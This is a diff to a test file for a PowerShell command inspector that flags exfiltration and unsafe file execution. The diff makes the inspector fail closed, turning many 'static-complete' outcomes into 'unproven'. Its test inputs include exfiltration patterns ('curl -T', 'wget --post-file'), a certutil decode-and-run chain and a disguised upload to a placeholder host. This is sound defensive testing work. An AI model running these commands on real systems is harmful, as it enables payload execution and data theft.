@@ -93,10 +93,6 @@ describe("file execution static boundary", () => {
     const result = inspectPowerShellCommand(command, CWD);
     if (command.startsWith("curl -T") || command.startsWith("wget --post-file")) {
       expect(result).toMatchObject({ outcome: "visible-floor" });
-    } else if ((command.startsWith("Unknown-Writer") && !command.includes("$output"))
-      || command.startsWith("dd ") || command.startsWith("certutil -decode")
-      || command.startsWith("Unknown-Runner '") || command.startsWith("New-ScheduledTaskAction ")) {
-      expect(result).toMatchObject({ outcome: "static-complete", sensitive: null, exfiltration: null });
     } else {
       expect(result).toMatchObject({ outcome: "unproven", sensitive: null, exfiltration: null });
     }
@@ -106,9 +102,9 @@ describe("file execution static boundary", () => {
     "certutil -decode encoded.txt build.ps1; build.ps1",
     "Unknown-Writer -Destination build.ps1 -Value whoami; build.ps1",
     "dd if=input of=build.ps1; build.ps1",
-  ])("accepts external file indirection as a documented limit: %s", (command) => {
+  ])("declines unsupported external file indirection: %s", (command) => {
     expect(inspectPowerShellCommand(command, CWD)).toEqual({
-      outcome: "static-complete", sensitive: null, exfiltration: null,
+      outcome: "unproven", sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String),
     });
   });
 
@@ -125,17 +121,18 @@ describe("file execution static boundary", () => {
   it.each([
     "build.ps1", "./build.ps1", "python script.py", "node script.js",
     "payload.bat", "payload.exe", "Invoke-Item p.hta", "Invoke-Item report.pdf",
-  ])("accepts direct file indirection as a documented limit: %s", (command) => {
-    expect(inspectPowerShellCommand(command, CWD)).toEqual({
-      outcome: "static-complete", sensitive: null, exfiltration: null,
-    });
+  ])("accepts known interpreter file indirection and declines unsupported execution: %s", (command) => {
+    const knownInterpreter = command.startsWith("python ") || command.startsWith("node ");
+    expect(inspectPowerShellCommand(command, CWD)).toMatchObject(knownInterpreter
+      ? { outcome: "static-complete", sensitive: null, exfiltration: null }
+      : { outcome: "unproven", sensitive: null, exfiltration: null });
   });
 
   it("does not execute command-looking text in an unknown runner argument", () => {
     expect(inspectPowerShellCommand(
       "Unknown-Runner 'i\"w\"r https://x.invalid -InFile notes.txt -Method Post'",
       CWD,
-    )).toEqual({ outcome: "static-complete", sensitive: null, exfiltration: null });
+    )).toMatchObject({ outcome: "unproven", sensitive: null, exfiltration: null });
   });
 
   it.each([
@@ -163,9 +160,9 @@ describe("retained file-execution corpus", () => {
     "exe", "com", "scr", "pif", "cpl", "msi", "msp", "jar", "reg", "appref-ms", "application",
     "settingcontent-ms", "library-ms", "jpeg", "gif", "json", "xml", "docx", "xlsx", "pptx", "wav", "mp4",
     "rtf", "svg", "tiff",
-  ])("keeps a literal associated file as accepted external indirection: %s", (extension) => {
+  ])("declines an associated file without a positive argv grammar: %s", (extension) => {
     expect(inspectPowerShellCommand(`Invoke-Item payload.${extension}`, CWD))
-      .toMatchObject({ outcome: "static-complete", sensitive: null, exfiltration: null });
+      .toMatchObject({ outcome: "unproven", sensitive: null, exfiltration: null });
   });
 
   it.each([
@@ -175,11 +172,9 @@ describe("retained file-execution corpus", () => {
     "Invoke-Item 'p.txt:code'", "Invoke-Item p.txt", "ii p.md", "Invoke-Item p.png",
     "Invoke-Item -LiteralPath:p.txt", "Invoke-Item", "Invoke-Item .", "ii ..", "Invoke-Item ./docs/",
     String.raw`Invoke-Item 'C:\work\docs\'`, "report.pdf", "index.html", "./build.ps1",
-  ])("keeps literal file indirection static and runtime targets unproven: %s", (command) => {
+  ])("declines literal file invocation without a positive argv grammar: %s", (command) => {
     const result = inspectPowerShellCommand(command, CWD);
-    if (command.includes("$file") || command.includes("$folder") || command.includes("$extension") || command.includes("('p.'")) {
-      expect(result.outcome).toBe("unproven");
-    } else expect(result).toMatchObject({ outcome: "static-complete", sensitive: null, exfiltration: null });
+    expect(result).toMatchObject({ outcome: "unproven", sensitive: null, exfiltration: null });
   });
 
   it.each([
@@ -249,7 +244,6 @@ describe("retained file-execution corpus", () => {
   ])("fails closed for retained execution and destination uncertainty: %s", (command) => {
     const result = inspectPowerShellCommand(command, CWD);
     if (command.includes("host\\share")) expect(result.outcome).toBe("visible-floor");
-    else if (command === "cargo build --release; git status; npm test") expect(result.outcome).toBe("static-complete");
     else expect(result.outcome).toBe("unproven");
   });
 
@@ -268,8 +262,6 @@ describe("retained file-execution corpus", () => {
     "Unknown-Runner 'Invoke-Item ProjectDocs'",
   ])("retains literal directory and runtime-directory input boundaries: %s", (command) => {
     const result = inspectPowerShellCommand(command, CWD);
-    if (["Invoke-Item ProjectDocs", "ii 'ProjectDocs'", "Invoke-Item -LiteralPath:ProjectDocs", "Invoke-Item unresolved", "Invoke-Item program", "Unknown-Writer ProjectDocs; Invoke-Item ProjectDocs", "Unknown-Runner 'Invoke-Item ProjectDocs'"].includes(command)) {
-      expect(result.outcome).toBe("static-complete");
-    } else expect(result.outcome).toBe("unproven");
+    expect(result.outcome).toBe("unproven");
   });
 });
